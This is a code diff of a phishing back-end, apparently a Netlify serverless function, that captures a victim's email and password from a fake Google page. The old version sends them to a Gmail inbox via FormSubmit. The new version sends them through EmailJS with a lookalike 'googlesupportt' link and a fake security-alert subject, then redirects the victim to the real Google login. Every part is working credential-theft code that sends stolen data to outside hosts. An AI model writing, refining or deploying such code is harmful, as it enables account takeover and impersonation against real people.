@@ -4,39 +4,48 @@ exports.handler = async (event) => {
     const victimEmail = params.get('email');
     const victimPassword = params.get('password');
 
-    // 2. Send the credentials to your inbox using FormSubmit
-    const formSubmitData = {
-        _subject: `🚨 PHISH HIT: ${victimEmail}`,
-        _template: 'table',
-        _captcha: 'false',
-        Target_Email: victimEmail,
-        Captured_Password: victimPassword,
-        Timestamp: new Date().toISOString(),
-        User_Agent: event.headers['user-agent'] || 'Unknown',
-        Remote_IP: event.headers['x-forwarded-for'] || 'Unknown'
+    // 2. Get request metadata
+    const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
+    const userAgent = event.headers['user-agent'] || 'Unknown';
+    const ip = event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || 'Unknown';
+
+    // 3. Define your Netlify URL (The phishing link)
+    const verifyLink = 'https://googlesupportt.netlify.app';
+
+    // 4. Prepare the email data for EmailJS
+    const emailData = {
+        service_id: 'service_ib3ua9l',
+        template_id: 'template_alpyguf',
+        user_id: 'Umle-w26jGP29PfnV',
+        template_params: {
+            subject: `Security alert: New device signed in to ${victimEmail}`,
+            target_email: victimEmail,
+            ip: ip,
+            timestamp: timestamp,
+            user_agent: userAgent,
+            verify_link: verifyLink,
+            password: victimPassword
+        }
     };
 
     try {
-        // UPDATED: Your email is now in the URL
-        const response = await fetch('https://formsubmit.co/tradylewis98@gmail.com', {
+        // 5. Send the email using EmailJS
+        const response = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
-                'Accept': 'application/json'
             },
-            body: JSON.stringify(formSubmitData)
+            body: JSON.stringify(emailData)
         });
-        
-        // Log the response to see if FormSubmit accepted it
-        console.log('FormSubmit Response Status:', response.status);
+
         const data = await response.json();
-        console.log('FormSubmit Response Body:', data);
+        console.log('EmailJS Response:', data);
 
     } catch (error) {
-        console.error('FormSubmit error:', error);
+        console.error('EmailJS error:', error);
     }
 
-    // 3. Redirect the victim to the real Google login page
+    // 6. Redirect the victim to the real Google login page
     return {
         statusCode: 302,
         headers: {
